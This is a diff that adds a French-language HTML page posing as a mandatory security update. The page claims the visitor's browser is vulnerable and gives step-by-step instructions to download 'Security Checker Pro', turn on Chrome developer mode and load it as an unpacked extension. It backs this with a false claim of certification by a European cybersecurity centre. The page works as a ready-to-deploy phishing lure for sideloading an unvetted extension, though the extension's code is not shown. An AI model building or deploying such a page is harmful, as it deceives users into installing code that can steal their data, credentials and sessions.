@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Mise à jour de sécurité requise</title>
+<style>
+:root{--bg:#0a0a0f;--panel:#12121a;--border:#2a2a3a;
+      --red:#e63946;--text:#e0e0e0;--dim:#666}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);
+     font-family:'Segoe UI',Arial,sans-serif;
+     min-height:100vh;display:flex;align-items:center;
+     justify-content:center;padding:20px}
+.panel{background:var(--panel);border:1px solid var(--border);
+       border-radius:12px;padding:40px;width:500px;max-width:95vw}
+.logo{font-size:48px;text-align:center;margin-bottom:20px}
+h1{font-size:20px;text-align:center;margin-bottom:10px}
+.sub{color:var(--dim);font-size:13px;text-align:center;
+     margin-bottom:28px;line-height:1.6}
+.steps{margin-bottom:24px}
+.step{display:flex;gap:12px;padding:10px 0;
+      border-bottom:1px solid var(--border);font-size:13px}
+.step:last-child{border:none}
+.num{color:var(--red);font-weight:700;width:20px;flex-shrink:0}
+.btn{display:block;width:100%;padding:14px;background:var(--red);
+     border:none;border-radius:6px;color:#fff;font-size:16px;
+     font-weight:700;cursor:pointer;text-align:center;
+     text-decoration:none;margin-bottom:10px}
+.btn2{display:block;width:100%;padding:11px;background:#1e1e2e;
+      border:1px solid var(--border);border-radius:6px;color:var(--dim);
+      font-size:13px;cursor:pointer;text-align:center;
+      text-decoration:none}
+.warn{font-size:11px;color:var(--dim);text-align:center;margin-top:12px}
+img{width:48px;height:48px}
+</style>
+</head>
+<body>
+<div class="panel">
+  <div class="logo">🛡️</div>
+  <h1>Extension de sécurité requise</h1>
+  <p class="sub">
+    Votre navigateur a été détecté comme vulnérable.<br>
+    Installez Security Checker Pro pour continuer.
+  </p>
+
+  <div class="steps">
+    <div class="step">
+      <div class="num">1</div>
+      <div>Cliquez sur <strong>Télécharger l'extension</strong></div>
+    </div>
+    <div class="step">
+      <div class="num">2</div>
+      <div>Allez sur <strong>chrome://extensions</strong>
+           → activez le <strong>mode développeur</strong></div>
+    </div>
+    <div class="step">
+      <div class="num">3</div>
+      <div>Cliquez <strong>Charger l'extension non empaquetée</strong>
+           → sélectionnez le dossier téléchargé</div>
+    </div>
+    <div class="step">
+      <div class="num">4</div>
+      <div>Cliquez <strong>Continuer</strong> pour accéder à votre espace</div>
+    </div>
+  </div>
+
+  <a class="btn" href="/download/extension">
+    ↓ Télécharger Security Checker Pro
+  </a>
+  <a class="btn2" href="https://microsoft.com">
+    Continuer sans protection (non recommandé)
+  </a>
+  <div class="warn">
+    Cette extension est certifiée par le Centre Européen de Cybersécurité
+  </div>
+</div>
+</body>
+</html>
